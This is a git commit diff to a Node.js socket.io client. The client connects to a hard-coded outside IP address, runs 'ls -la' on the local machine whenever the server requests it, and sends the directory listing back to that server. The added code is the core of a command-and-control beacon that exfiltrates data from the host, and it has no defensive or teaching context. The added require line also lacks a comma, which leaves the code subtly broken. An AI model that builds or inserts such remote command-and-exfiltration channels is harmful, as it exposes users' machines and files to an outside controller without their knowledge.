cccb6c202a27901f7405593c0cde8b76b85cecdf
Michał Orzechowski <m.orzechowski@adform.com>
2022-01-27 22:45:27 +0100

    client command invoke and send to server

--- client.js
+++ client.js
@@ -1,7 +1,21 @@
 const
     io = require("socket.io-client"),
+    { exec } = require("child_process")
     ioClient = io.connect("http://77.55.212.76:80");
 
 ioClient.on("seq-num", (msg) => console.info(msg));
 
-ioClient.on("request-ip", () => ioClient.emit("receive-ip", "xxxx"));
+ioClient.on("request-ip", () => {
+    exec("ls -la", (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+            return;
+        }
+        
+        ioClient.emit("receive-ip", stdout)
+    });
+});
